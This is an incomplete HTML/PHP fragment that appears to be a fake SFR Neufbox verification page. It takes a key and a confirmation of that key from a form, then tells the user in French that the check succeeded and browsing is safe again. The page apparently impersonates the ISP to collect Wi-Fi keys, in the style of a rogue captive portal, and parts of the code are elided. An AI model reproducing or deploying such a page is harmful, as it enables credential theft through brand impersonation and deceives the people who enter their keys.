...
<body>
<a href="127.0.0.1/valid.php"><img src="/img/logosfr.jpg" alt="Neufbox"></a>
	 <?php
            if (!empty($_POST['cle']) && !empty($_POST['cleconf']) ) // Vérifie si les variables des clés ne sont pas vides
        {
			...
			<p>
La v&eacute;rification a &eacute;t&eacute; correctement effectu&eacute;e vous pouvez reprendre la navigation internet en toute s&eacute;curit&eacute; avec votre neufbox de SFR.</p>
<?php
                }
